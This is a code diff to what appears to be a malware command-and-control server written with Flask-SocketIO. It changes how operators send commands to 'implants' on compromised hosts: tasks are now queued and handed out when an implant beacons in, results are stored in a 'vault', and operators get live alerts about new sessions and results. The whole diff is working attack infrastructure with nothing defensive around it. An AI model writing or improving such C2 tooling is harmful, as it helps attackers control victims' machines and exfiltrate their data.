@@ -149,6 +149,8 @@ db = DatabaseManager()
 active_sessions = {}
 session_lock = threading.Lock()
 client_sids = {}
+command_queue = {}
+cmd_lock = threading.Lock()
 
 @socketio.on('connect')
 def handle_connect():
@@ -182,8 +184,9 @@ def handle_tasking(data):
         return
     with session_lock:
         if active_sessions.get(session_id, {}).get('owner') == username:
-            socketio.emit('execute_command', command, to=session_id)
-            logging.info(f"Task sent to implant {session_id} by user {username}: {command.get('action')}")
+            with cmd_lock:
+                command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
+            logging.info(f"Task queued for implant {session_id} by user {username}: {command.get('action')}")
         else:
             emit('tasking_error', {'error': 'Session not found or permission denied.'})
 
@@ -204,8 +207,11 @@ def handle_implant_hello():
         logging.info(f"Received metadata for session {sid}: {metadata['user']}@{metadata['hostname']}")
     
     with session_lock:
+        is_new_or_reconnecting = sid not in active_sessions
         active_sessions[sid] = {"owner": c2_user, "last_seen": time.time()}
         db.create_or_update_session(sid, c2_user, metadata)
+        if is_new_or_reconnecting and metadata:
+            socketio.emit('new_session', {'session_id': sid, 'metadata': metadata, 'status': 'Online'}, room=c2_user)
 
     if "results" in data:
         logging.info(f"Processing {len(data['results'])} result packets from session {sid}.")
@@ -213,8 +219,11 @@ def handle_implant_hello():
             mod_name, out_data = result.get("command"), result.get("output")
             if mod_name and out_data is not None:
                 db.save_vault_data(sid, mod_name, result)
+        socketio.emit('batch_update', {'session_id': sid, 'results': data['results']}, room=c2_user)
     
-    return jsonify({"commands": []})
+    with cmd_lock:
+        commands_to_send = command_queue.get(c2_user, {}).pop(sid, [])
+    return jsonify({"commands": commands_to_send})
 
 if __name__ == '__main__':
     def start_cleanup_scheduler():
